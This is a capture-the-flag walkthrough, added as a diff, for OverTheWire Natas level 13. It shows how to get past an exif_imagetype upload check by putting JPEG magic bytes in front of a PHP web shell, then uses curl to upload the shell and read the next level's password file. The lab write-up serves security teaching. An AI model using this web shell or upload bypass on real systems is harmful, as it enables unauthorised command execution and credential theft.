@@ -1,0 +1,51 @@
+Level 13
+--------
+
+Oh, now they only accept image files. I bet we can get around
+that restriction just like we did when they disallowed certain
+characters in the search term. Let's examine the code.
+
+Here's the new part of the code:
+
+    if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    }
+
+Let's look up the `exif_imagetype` function so we can figure out
+how to manipulate the return value:
+
+> exif_imagetype() reads the first bytes of an image and checks its signature.
+
+Okay, so the first bytes of our payload now have to be the magic
+bytes to make this return true.
+
+> When a correct signature is found, the appropriate constant
+> value will be returned otherwise the return value is FALSE.
+
+So, we can pick any supported image type we want. Pick one from
+<http://www.astro.keele.ac.uk/oldusers/rno/Computing/File_magic.html>
+and use the magic numbers like so:
+
+    perl -E 'my $magic_numbers = "\x{ff}\x{d8}\x{ff}\x{e0}"; say $magic_numbers . q{<? passthru($_GET["cmd"]); ?>};' > shell.php
+
+Now if we upload this, the upload code will think it is a JPG image,
+but since it has a `.php` extension, Apache will execute it as PHP.
+
+We'll be able to run our exploit as before.
+
+
+    curl -u natas13:... \
+        -F MAX_FILE_SIZE=1000 \
+        -F filename=pwnd.php \
+        -F "uploadedfile=@shell.php" \
+        http://natas13.natas.labs.overthewire.org/index.php
+
+    curl -u natas13:... \
+        "http://natas13.natas.labs.overthewire.org/upload/dz31pf9ai5.php?cmd=cat%20/etc/natas_webpass/natas14"
+
+    ����...
+
+Remember, PHP is not a programming language, it is a templating language,
+so Apache outputs the magic bytes we inserted, and then the output of the
+PHP code it executed. So, skip the first 4 bytes of the response, and
+take the remainder as your password for the next level.
